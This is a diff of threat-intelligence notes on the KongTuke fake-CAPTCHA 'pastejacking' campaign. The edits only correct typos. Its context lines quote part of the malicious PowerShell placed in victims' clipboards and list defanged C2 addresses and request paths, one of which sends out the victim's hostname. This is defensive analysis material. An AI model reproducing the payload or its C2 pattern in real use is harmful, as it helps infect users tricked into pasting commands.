@@ -6,11 +6,11 @@ AUTHOR:
 
 NOTES:
 
-- This attack chain starts with injected script into legitimate but compromised websites.
-- The injected script leads to a fake "verify you are human" (aka CAPTHCA) page.
+- This attack chain starts with a malicious line of script injected into legitimate but compromised websites.
+- The injected script leads to a fake "verify you are human" page (CAPTCHA).
 - The fake CAPTCHA page injects script into a potential victim's clipboard.
-- This process is sometimes referred to as "clipboard hijacking" or "pastejacking."
-- The fake CAPTCH page contains instructions 
+- This process is sometimes called "clipboard hijacking" or "pastejacking."
+- The fake CAPTCHA page contains instructions 
 - This activity is tracked as #KongTuke by sources like @monitorsg on Mastodon and Threatfox:
   -- https://infosec.exchange/@monitorsg
   -- https://threatfox.abuse.ch/browse/tag/Kongtuke
@@ -29,12 +29,12 @@ SCRIPT INJECTED INTO CLIPBOARD BY FAKE CAPTCHA PAGE:
   $y = ([datetime]('01/01/' + '1970')); $x = ($z - $y).TotalSeconds; 
   $w = [math]::Floor($x); $v = $w - ($w % 16); [int64]$v))"
 
-TRAFFIC FROM PASTED SCRITP:
+TRAFFIC FROM PASTED SCRIPT:
 
 - 138.199.156[.]22:8080 - 138.199.156[.]22:8080 - GET /1743783280
 - 138.199.156[.]22:8080 - 138.199.156[.]22:8080 - POST /1743783296
 - 185.250.151[.]155:80 - ecduutcykpvkbim[.]top - GET /1.php?s=527
-- 185.250.151[.]155:80 - bfidmcjejlilflg[.]top - GET /z8v7ymbcinhtr.php?id=[hostname]C&key=[11-digit number]&s=527
+- 185.250.151[.]155:80 - bfidmcjejlilflg[.]top - GET /z8v7ymbcinhtr.php?id=[hostname]&key=[11-digit number]&s=527
 
 POST-INFECTION C2 TRAFFIC:
 
